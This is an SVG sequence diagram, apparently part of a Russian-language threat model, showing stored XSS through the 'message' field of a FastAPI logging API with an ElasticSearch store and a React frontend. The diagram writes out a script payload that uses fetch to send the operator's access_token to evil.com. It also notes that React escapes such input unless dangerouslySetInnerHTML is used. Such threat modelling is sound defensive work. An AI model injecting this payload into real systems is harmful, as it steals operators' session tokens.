<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" contentstyletype="text/css" data-diagram-type="SEQUENCE" height="1171px" preserveAspectRatio="none" style="width:1047px;height:1171px;background:#FFFFFF;" version="1.1" viewBox="0 0 1047 1171" width="1047px" zoomAndPan="magnify" xmlns:xhtml="http://www.w3.org/1999/xhtml"><style>
             .markmap-foreign div { color: #333 !important; }
             .markmap-foreign strong { font-weight: bold !important; }
             .markmap-foreign table { border-collapse: collapse !important; }
             .markmap-foreign th, .markmap-foreign td { border: 1px solid #333 !important; padding: 3px !important; }
             .markmap-node > circle { fill: #fff !important; }</style><title>Угроза 4: XSS через поле message (Cross-Site Scripting)</title><defs></defs><g><text fill="#000000" font-family="sans-serif" font-size="14" font-weight="bold" lengthAdjust="spacing" textLength="455.9844" x="291.9897" y="27.9951">Угроза 4: XSS через поле message (Cross-Site Scripting)</text><rect fill="none" height="321.5313" style="stroke:#000000;stroke-width:1.5;" width="1007.2744" x="10" y="735.9453"></rect><g class="participant-lifeline" data-entity-uid="part1" data-qualified-name="Attacker" id="part1-lifeline"><g><title>.............</title><rect fill="#000000" fill-opacity="0.00000" height="939.5859" width="8" x="81.5386" y="134.8906"></rect><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5,5;" x1="85" x2="85" y1="134.8906" y2="1074.4766"></line></g></g><g class="participant-lifeline" data-entity-uid="part2" data-qualified-name="Nginx" id="part2-lifeline"><g><title>Nginx</title><rect fill="#000000" fill-opacity="0.00000" height="939.5859" width="8" x="300.8687" y="134.8906"></rect><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5,5;" x1="304.665" x2="304.665" y1="134.8906" y2="1074.4766"></line></g></g><g class="participant-lifeline" data-entity-uid="part3" data-qualified-name="Backend" id="part3-lifeline"><g><title>FastAPI Backend</title><rect fill="#000000" fill-opacity="0.00000" height="939.5859" width="8" x="431.0776" y="134.8906"></rect><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5,5;" x1="434.8901" x2="434.8901" y1="134.8906" y2="1074.4766"></line></g></g><g class="participant-lifeline" data-entity-uid="part4" data-qualified-name="ES" id="part4-lifeline"><g><title>ElasticSearch</title><rect fill="#000000" fill-opacity="0.00000" height="939.5859" width="8" x="654.2354" y="134.8906"></rect><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5,5;" x1="658.1904" x2="658.1904" y1="134.8906" y2="1074.4766"></line></g></g><g class="participant-lifeline" data-entity-uid="part5" data-qualified-name="Frontend" id="part5-lifeline"><g><title>React Frontend</title><rect fill="#000000" fill-opacity="0.00000" height="939.5859" width="8" x="775.1133" y="134.8906"></rect><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5,5;" x1="778.2803" x2="778.2803" y1="134.8906" y2="1074.4766"></line></g></g><g class="participant-lifeline" data-entity-uid="part6" data-qualified-name="Operator" id="part6-lifeline"><g><title>........</title><rect fill="#000000" fill-opacity="0.00000" height="939.5859" width="8" x="993.0342" y="134.8906"></rect><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5,5;" x1="996.1045" x2="996.1045" y1="134.8906" y2="1074.4766"></line></g></g><g class="participant participant-head" data-entity-uid="part1" data-qualified-name="Attacker" id="part1-head"><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="122.623" x="21.2271" y="115.292">Злоумышленник</text><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="125.0771" x="20" y="131.5889">(имеет API-ключ)</text><ellipse cx="85.5386" cy="50.7969" fill="#FF0000" rx="8" ry="8" style="stroke:#181818;stroke-width:0.5;"></ellipse><path d="M85.5386,58.7969 L85.5386,85.7969 M72.5386,66.7969 L98.5386,66.7969 M85.5386,85.7969 L72.5386,100.7969 M85.5386,85.7969 L98.5386,100.7969" fill="none" style="stroke:#181818;stroke-width:0.5;"></path></g><g class="participant participant-tail" data-entity-uid="part1" data-qualified-name="Attacker" id="part1-tail"><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="122.623" x="21.2271" y="1086.4717">Злоумышленник</text><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="125.0771" x="20" y="1102.7686">(имеет API-ключ)</text><ellipse cx="85.5386" cy="1114.5703" fill="#FF0000" rx="8" ry="8" style="stroke:#181818;stroke-width:0.5;"></ellipse><path d="M85.5386,1122.5703 L85.5386,1149.5703 M72.5386,1130.5703 L98.5386,1130.5703 M85.5386,1149.5703 L72.5386,1164.5703 M85.5386,1149.5703 L98.5386,1164.5703" fill="none" style="stroke:#181818;stroke-width:0.5;"></path></g><g class="participant participant-head" data-entity-uid="part2" data-qualified-name="Nginx" id="part2-head"><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="54.4072" x="277.665" y="103.5938"></rect><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="40.4072" x="284.665" y="123.5889">Nginx</text></g><g class="participant participant-tail" data-entity-uid="part2" data-qualified-name="Nginx" id="part2-tail"><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="54.4072" x="277.665" y="1073.4766"></rect><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="40.4072" x="284.665" y="1093.4717">Nginx</text></g><g class="participant participant-head" data-entity-uid="part3" data-qualified-name="Backend" id="part3-head"><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="130.375" x="369.8901" y="103.5938"></rect><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="116.375" x="376.8901" y="123.5889">FastAPI Backend</text></g><g class="participant participant-tail" data-entity-uid="part3" data-qualified-name="Backend" id="part3-tail"><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="130.375" x="369.8901" y="1073.4766"></rect><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="116.375" x="376.8901" y="1093.4717">FastAPI Backend</text></g><g class="participant participant-head" data-entity-uid="part4" data-qualified-name="ES" id="part4-head"><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="94.0898" x="608.1904" y="131.5889">ElasticSearch</text><path d="M640.2354,82.5938 C640.2354,72.5938 658.2354,72.5938 658.2354,72.5938 C658.2354,72.5938 676.2354,72.5938 676.2354,82.5938 L676.2354,108.5938 C676.2354,118.5938 658.2354,118.5938 658.2354,118.5938 C658.2354,118.5938 640.2354,118.5938 640.2354,108.5938 L640.2354,82.5938" fill="#E2E2F0" style="stroke:#181818;stroke-width:0.5;"></path><path d="M640.2354,82.5938 C640.2354,92.5938 658.2354,92.5938 658.2354,92.5938 C658.2354,92.5938 676.2354,92.5938 676.2354,82.5938" fill="none" style="stroke:#181818;stroke-width:0.5;"></path></g><g class="participant participant-tail" data-entity-uid="part4" data-qualified-name="ES" id="part4-tail"><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="94.0898" x="608.1904" y="1086.4717">ElasticSearch</text><path d="M640.2354,1099.7734 C640.2354,1089.7734 658.2354,1089.7734 658.2354,1089.7734 C658.2354,1089.7734 676.2354,1089.7734 676.2354,1099.7734 L676.2354,1125.7734 C676.2354,1135.7734 658.2354,1135.7734 658.2354,1135.7734 C658.2354,1135.7734 640.2354,1135.7734 640.2354,1125.7734 L640.2354,1099.7734" fill="#E2E2F0" style="stroke:#181818;stroke-width:0.5;"></path><path d="M640.2354,1099.7734 C640.2354,1109.7734 658.2354,1109.7734 658.2354,1109.7734 C658.2354,1109.7734 676.2354,1109.7734 676.2354,1099.7734" fill="none" style="stroke:#181818;stroke-width:0.5;"></path></g><g class="participant participant-head" data-entity-uid="part5" data-qualified-name="Frontend" id="part5-head"><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="121.666" x="718.2803" y="103.5938"></rect><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="107.666" x="725.2803" y="123.5889">React Frontend</text></g><g class="participant participant-tail" data-entity-uid="part5" data-qualified-name="Frontend" id="part5-tail"><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="121.666" x="718.2803" y="1073.4766"></rect><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="107.666" x="725.2803" y="1093.4717">React Frontend</text></g><g class="participant participant-head" data-entity-uid="part6" data-qualified-name="Operator" id="part6-head"><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="71.8594" x="958.1045" y="131.5889">Оператор</text><ellipse cx="997.0342" cy="67.0938" fill="#E2E2F0" rx="8" ry="8" style="stroke:#181818;stroke-width:0.5;"></ellipse><path d="M997.0342,75.0938 L997.0342,102.0938 M984.0342,83.0938 L1010.0342,83.0938 M997.0342,102.0938 L984.0342,117.0938 M997.0342,102.0938 L1010.0342,117.0938" fill="none" style="stroke:#181818;stroke-width:0.5;"></path></g><g class="participant participant-tail" data-entity-uid="part6" data-qualified-name="Operator" id="part6-tail"><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="71.8594" x="958.1045" y="1086.4717">Оператор</text><ellipse cx="997.0342" cy="1098.2734" fill="#E2E2F0" rx="8" ry="8" style="stroke:#181818;stroke-width:0.5;"></ellipse><path d="M997.0342,1106.2734 L997.0342,1133.2734 M984.0342,1114.2734 L1010.0342,1114.2734 M997.0342,1133.2734 L984.0342,1148.2734 M997.0342,1133.2734 L1010.0342,1148.2734" fill="none" style="stroke:#181818;stroke-width:0.5;"></path></g><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1;" width="1040.9639" x="0" y="165.457"></rect><line style="stroke:#000000;stroke-width:1;" x1="0" x2="1040.9639" y1="165.457" y2="165.457"></line><line style="stroke:#000000;stroke-width:1;" x1="0" x2="1040.9639" y1="168.457" y2="168.457"></line><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2;" width="323.1182" x="358.9229" y="154.8906"></rect><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="304.5923" x="364.9229" y="170.9575">Этап 1: Инъекция вредоносного payload</text><g class="message" data-entity-1="part1" data-entity-2="part2" id="msg1"><polygon fill="#181818" points="292.8687,311.0859,302.8687,315.0859,292.8687,319.0859,296.8687,315.0859" style="stroke:#181818;stroke-width:1;"></polygon><line style="stroke:#181818;stroke-width:1;" x1="85.5386" x2="298.8687" y1="315.0859" y2="315.0859"></line><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="128.21" x="92.5386" y="204.0903">POST /api/log/event</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="138.2964" x="92.5386" y="219.2231">[X-API-Key: &lt;ключ&gt;]</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="183.1172" x="92.5386" y="234.356">[Body: [{service: "delivery",</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="85.8457" x="96.6709" y="249.4888">service_id: 1,</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="169.0571" x="96.6709" y="264.6216">message: "&lt;script&gt;fetch(</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="167.2734" x="96.6709" y="279.7544">'https://evil.com/steal?t='</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="152.1914" x="96.6709" y="294.8872">+localStorage.getItem(</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191.1978" x="96.6709" y="310.02">'access_token'))&lt;/script&gt;"}]]</text></g><g class="message" data-entity-1="part2" data-entity-2="part3" id="msg2"><polygon fill="#181818" points="423.0776,340.2188,433.0776,344.2188,423.0776,348.2188,427.0776,344.2188" style="stroke:#181818;stroke-width:1;"></polygon><line style="stroke:#181818;stroke-width:1;" x1="304.8687" x2="429.0776" y1="344.2188" y2="344.2188"></line><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="106.209" x="311.8687" y="339.1528">Проксирование</text></g><g class="message" data-entity-1="part3" data-entity-2="part3" id="msg3"><line style="stroke:#181818;stroke-width:1;" x1="435.0776" x2="477.0776" y1="403.6172" y2="403.6172"></line><line style="stroke:#181818;stroke-width:1;" x1="477.0776" x2="477.0776" y1="403.6172" y2="416.6172"></line><line style="stroke:#181818;stroke-width:1;" x1="436.0776" x2="477.0776" y1="416.6172" y2="416.6172"></line><polygon fill="#181818" points="446.0776,412.6172,436.0776,416.6172,446.0776,420.6172,442.0776,416.6172" style="stroke:#181818;stroke-width:1;"></polygon><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="90.7397" x="442.0776" y="368.2856">Валидация ✓</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191.2612" x="442.0776" y="383.4185">(message: 1-1024 символов,</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="155.6001" x="442.0776" y="398.5513">HTML не фильтруется)</text></g><g class="message" data-entity-1="part3" data-entity-2="part4" id="msg4"><polygon fill="#181818" points="646.2354,441.75,656.2354,445.75,646.2354,449.75,650.2354,445.75" style="stroke:#181818;stroke-width:1;"></polygon><line style="stroke:#181818;stroke-width:1;" x1="435.0776" x2="652.2354" y1="445.75" y2="445.75"></line><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="143.7427" x="442.0776" y="440.6841">Сохранение события</text></g><g class="message" data-entity-1="part4" data-entity-2="part3" id="msg5"><polygon fill="#181818" points="446.0776,470.8828,436.0776,474.8828,446.0776,478.8828,442.0776,474.8828" style="stroke:#181818;stroke-width:1;"></polygon><line style="stroke:#181818;stroke-width:1;stroke-dasharray:2,2;" x1="440.0776" x2="657.2354" y1="474.8828" y2="474.8828"></line><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="18.7573" x="452.0776" y="469.8169">OK</text></g><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1;" width="1040.9639" x="0" y="503.4492"></rect><line style="stroke:#000000;stroke-width:1;" x1="0" x2="1040.9639" y1="503.4492" y2="503.4492"></line><line style="stroke:#000000;stroke-width:1;" x1="0" x2="1040.9639" y1="506.4492" y2="506.4492"></line><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2;" width="283.9658" x="378.499" y="492.8828"></rect><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="265.4399" x="384.499" y="508.9497">Этап 2: Исполнение при просмотре</text><g class="message" data-entity-1="part6" data-entity-2="part5" id="msg6"><polygon fill="#181818" points="790.1133,543.1484,780.1133,547.1484,790.1133,551.1484,786.1133,547.1484" style="stroke:#181818;stroke-width:1;"></polygon><line style="stroke:#181818;stroke-width:1;" x1="784.1133" x2="996.0342" y1="547.1484" y2="547.1484"></line><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="193.9209" x="796.1133" y="542.0825">Открывает журнал событий</text></g><g class="message" data-entity-1="part5" data-entity-2="part3" id="msg7"><polygon fill="#181818" points="446.0776,572.2813,436.0776,576.2813,446.0776,580.2813,442.0776,576.2813" style="stroke:#181818;stroke-width:1;"></polygon><line style="stroke:#181818;stroke-width:1;" x1="440.0776" x2="778.1133" y1="576.2813" y2="576.2813"></line><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="126.9468" x="452.0776" y="571.2153">GET /api/log/events</text></g><g class="message" data-entity-1="part3" data-entity-2="part4" id="msg8"><polygon fill="#181818" points="646.2354,601.4141,656.2354,605.4141,646.2354,609.4141,650.2354,605.4141" style="stroke:#181818;stroke-width:1;"></polygon><line style="stroke:#181818;stroke-width:1;" x1="435.0776" x2="652.2354" y1="605.4141" y2="605.4141"></line><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="48.1533" x="442.0776" y="600.3481">Запрос</text></g><g class="message" data-entity-1="part4" data-entity-2="part3" id="msg9"><polygon fill="#181818" points="446.0776,630.5469,436.0776,634.5469,446.0776,638.5469,442.0776,634.5469" style="stroke:#181818;stroke-width:1;"></polygon><line style="stroke:#181818;stroke-width:1;stroke-dasharray:2,2;" x1="440.0776" x2="657.2354" y1="634.5469" y2="634.5469"></line><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="199.1577" x="452.0776" y="629.481">Включая запись со скриптом</text></g><g class="message" data-entity-1="part3" data-entity-2="part5" id="msg10"><polygon fill="#181818" points="767.1133,659.6797,777.1133,663.6797,767.1133,667.6797,771.1133,663.6797" style="stroke:#181818;stroke-width:1;"></polygon><line style="stroke:#181818;stroke-width:1;stroke-dasharray:2,2;" x1="435.0776" x2="773.1133" y1="663.6797" y2="663.6797"></line><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="203.0361" x="442.0776" y="658.6138">JSON с вредоносным message</text></g><g class="message" data-entity-1="part5" data-entity-2="part5" id="msg11"><line style="stroke:#181818;stroke-width:1;" x1="779.1133" x2="821.1133" y1="707.9453" y2="707.9453"></line><line style="stroke:#181818;stroke-width:1;" x1="821.1133" x2="821.1133" y1="707.9453" y2="720.9453"></line><line style="stroke:#181818;stroke-width:1;" x1="780.1133" x2="821.1133" y1="720.9453" y2="720.9453"></line><polygon fill="#181818" points="790.1133,716.9453,780.1133,720.9453,790.1133,724.9453,786.1133,720.9453" style="stroke:#181818;stroke-width:1;"></polygon><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="135.9097" x="786.1133" y="687.7466">Рендеринг message</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="43.2529" x="786.1133" y="702.8794">в DOM</text></g><path d="M10,735.9453 L74.4429,735.9453 L74.4429,743.0781 L64.4429,753.0781 L10,753.0781 L10,735.9453" fill="#EEEEEE" style="stroke:#000000;stroke-width:1.5;"></path><rect fill="none" height="321.5313" style="stroke:#000000;stroke-width:1.5;" width="1007.2744" x="10" y="735.9453"></rect><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="19.4429" x="25" y="749.0122">alt</text><text fill="#000000" font-family="sans-serif" font-size="11" font-weight="bold" lengthAdjust="spacing" textLength="256.5503" x="89.4429" y="748.1558">[React по умолчанию экранирует HTML]</text><g class="message" data-entity-1="part5" data-entity-2="part5" id="msg12"><line style="stroke:#181818;stroke-width:1;" x1="779.1133" x2="821.1133" y1="804.4766" y2="804.4766"></line><line style="stroke:#181818;stroke-width:1;" x1="821.1133" x2="821.1133" y1="804.4766" y2="817.4766"></line><line style="stroke:#181818;stroke-width:1;" x1="780.1133" x2="821.1133" y1="817.4766" y2="817.4766"></line><polygon fill="#181818" points="790.1133,813.4766,780.1133,817.4766,790.1133,821.4766,786.1133,817.4766" style="stroke:#181818;stroke-width:1;"></polygon><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="145.4502" x="786.1133" y="769.145">React автоматически</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="141.813" x="786.1133" y="784.2778">экранирует &lt;script&gt;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="122.0273" x="786.1133" y="799.4106">в JSX ({message})</text></g><path d="M784,830.4766 L784,885.4766 L1007,885.4766 L1007,840.4766 L997,830.4766 L784,830.4766" fill="#90EE90" style="stroke:#181818;stroke-width:0.5;"></path><path d="M997,830.4766 L997,840.4766 L1007,840.4766 L997,830.4766" fill="#90EE90" style="stroke:#181818;stroke-width:0.5;"></path><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="161.9287" x="790" y="847.5435">React защищает от XSS</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="153.918" x="790" y="862.6763">при использовании {}</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="202.2744" x="790" y="877.8091">(не dangerouslySetInnerHTML)</text><line style="stroke:#000000;stroke-width:1;stroke-dasharray:2,2;" x1="10" x2="1017.2744" y1="891.875" y2="891.875"></line><text fill="#000000" font-family="sans-serif" font-size="11" font-weight="bold" lengthAdjust="spacing" textLength="297.6016" x="15" y="902.0854">[Если используется dangerouslySetInnerHTML]</text><g class="message" data-entity-1="part5" data-entity-2="part5" id="msg13"><line style="stroke:#181818;stroke-width:1;" x1="779.1133" x2="821.1133" y1="926.8125" y2="926.8125"></line><line style="stroke:#181818;stroke-width:1;" x1="821.1133" x2="821.1133" y1="926.8125" y2="939.8125"></line><line style="stroke:#181818;stroke-width:1;" x1="780.1133" x2="821.1133" y1="939.8125" y2="939.8125"></line><polygon fill="#181818" points="790.1133,935.8125,780.1133,939.8125,790.1133,943.8125,786.1133,939.8125" style="stroke:#181818;stroke-width:1;"></polygon><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="146.2627" x="786.1133" y="921.7466">Скрипт исполняется!</text></g><g class="message" data-entity-1="part5" data-entity-2="part1" id="msg14"><polygon fill="#181818" points="96.5386,980.0781,86.5386,984.0781,96.5386,988.0781,92.5386,984.0781" style="stroke:#181818;stroke-width:1;"></polygon><line style="stroke:#181818;stroke-width:1;" x1="90.5386" x2="778.1133" y1="984.0781" y2="984.0781"></line><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="163.9663" x="102.5386" y="963.8794">access_token отправлен</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="75.4102" x="102.5386" y="979.0122">на evil.com</text></g><path d="M784,997.0781 L784,1052.0781 L986,1052.0781 L986,1007.0781 L976,997.0781 L784,997.0781" fill="#FFC0CB" style="stroke:#181818;stroke-width:0.5;"></path><path d="M976,997.0781 L976,1007.0781 L986,1007.0781 L976,997.0781" fill="#FFC0CB" style="stroke:#181818;stroke-width:0.5;"></path><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="105.7583" x="790" y="1014.145">Токен украден.</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="181.6699" x="790" y="1029.2778">Злоумышленник получает</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="128.5337" x="790" y="1044.4106">доступ оператора.</text><!--?plantuml-src VLNRRjj647tdLqoL1qj8PTL1dWJBHT8wRP8c2i8y68YCWAKsCX6Q5CYjKSCmOCjDd8iR0osAzA58Ryy5L5kgLKcsVs7t5_ebFRCa9JEEOmCKkJjpTkRCcLdfIL-G-bCTwYrreevKbwvMQScsIU-gFjRwweZKARP6ga-h8ewTbg3YPr4OnsNRau9iD_BQqWjQ9SjoN1b6L51lO7sYTzHOlzBFsLCTut-WXesWY9yn5lgwGzVktIoheHhfrtgtL20dfcjIEkuJ4T6bI3IjjXD9p_NQJY2fSBVb1TyQ8_EMtxpXn19eT9szWwOnIz-jfYEThvrOK67HXvddsiA9t1LZisZdSUuBf40teZ2G6KpsCKdkBUXWPhgwWoItZ56zBI87svPLgv7w2pjTTKfpLL8_gsFz4laEzJCrqFka3WofFJ1w3FTjVgf3TK9jPzqFdIRLQfOreQ6ya6HBLRfNjnzGnMbx5JziLSIQ26GZUBXKPX9lY_KgpMTKBYnZuthOnDh3ZLX4QvuhgbHe2jzR4z5wuUD6GEdo8wzPfJbUI4iBk_dOL7JXiP3kIX5RCojIjkDg1OTw_gmRhbPYAHp_KrcRmUvbFtGTtqRoS9zj2NbJYbNZvhWkG1_946MOAPNcAobmONDvsRAIl91WMYUag7ur8Xo2bO5vEm2Dh9k-bHdbxN_0_WZxFHGZeVU_Ntw4nYR9p9NdFhbobHWGgZimCWOi4lxomPsl2E1zqjzXSwJtT4TlGRCGfjxM-r3pcJCNRJxkTnJiALUU_PB06Ff4_GsTT_Xy2uRbN8prstbDN65Dm2bfgIcEEWNm8FbXMOpnxB1KZ20oVN4icI0vehT07IBiLuOgxYdrZzw1sp4pamjE_MjDF7CHVh7uhgxYywc_uU2JqCxdY3gaqaCT8F4ZDWOTsthFXC2F8QS72FIC6a_ny_dSikjtOVoU9a66uqoZLYwHitJyPkZicVOSuEqmSsa4we0-hz_1YF8b9LtE9I0UKbm93fqheL-J_ju4ctocYY2MYqNuk-3e5BABo4s6PZeCp0n5xchG2DuBc_MQYU-MlKJ5ZJJYpP8vBWWnOYEljI8fV3mzy9BFIwr8YC2OKHO0gDSlSC2BJ0vG4O_pr2fJsI1JeDw3oxJH1hIncPeMJNCqdQ0bel2Rs5-tqTf182Ac8WcE8-40BU5ZlAgV03ewXpvjgOl0FiGhUcwYd3F04CH-1llHEV_9-ApIsHbao30Ce4p9hGJUqIcK3ROFKjxsWYSPZN_mc6805b1IrXv_pcO65zw0wMMA9jrDIfHvz5Zeo6W7Gm8MkJj6TMVV8HptqVy0?--></g></svg>